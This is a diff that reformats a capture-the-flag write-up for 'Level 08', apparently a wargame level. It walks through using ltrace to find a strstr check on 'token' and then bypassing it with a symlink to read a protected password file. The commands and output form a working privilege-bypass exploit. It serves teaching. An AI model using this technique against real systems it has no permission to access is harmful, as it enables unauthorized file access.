@@ -1,29 +1,52 @@
-▐▓▌   ▐▓▓▓▓▌▐▓▌▐▓▌▐▓▓▓▓▌▐▓▌   ▐▓▓▓▓▌▐▓▓▓▓▌
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
-▐▓▌   ▐▓▓▓▌ ▐▓▌▐▓▌▐▓▓▓▌ ▐▓▌   ▐▓▌▐▓▌▐▓▓▓▓▌
-▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌   ▐▓▌   ▐▓▌▐▓▌▐▓▌▐▓▌
-▐▓▓▓▓▌▐▓▓▓▓▌ ▐▓▓▌ ▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌▐▓▓▓▓▌
+# Level 08
 
-exploit: strstr bypass with symbolic links
+**Exploit:** Symlink-based filename-check bypass
 
-=======
+The program rejects paths containing `token`, but follows a symlink whose name does not contain that word.
 
-We have a script and a token file. We dont have permissions for the token file. Let's test the script with a custom file:
+## Walkthrough
 
+The program can read a file when given its path. Test it with a file you own:
+
+```bash
 echo 'bonjour les amis' > /tmp/test2
 ./level08 /tmp/test2
+```
+
+Output:
+
+```text
 bonjour les amis
+```
 
-Ok so it prints the content of the file. We need to use this to our adventage. 
+The program prints the file contents. Trace its filename check with `ltrace`:
 
+```bash
 ltrace ./level08 /tmp/test
+```
+
+Output:
+
+```text
 strstr("/tmp/test", "token")                                    = NULL
 open("/tmp/test", 0, 014435162522)                              = 3
+```
 
+```bash
 ltrace ./level08 token
+```
+
+Output:
+
+```text
 strstr("token", "token")                                        = "token"
+```
 
-Ok so it is a simple strstr check. We still need to content of the token so let's create a symbolic link to buypass this silly check.
+The trace shows a substring check for `token`. Create a symlink with a different name that points to the protected file, then pass the link to the program:
+
+```bash
 ln -s /home/user/level08/token /tmp/link
+./level08 /tmp/link
+```
 
-Calling the programm with this symbolic link works and we get the password to flag08.
+The program follows the symlink and prints the password for `flag08`.
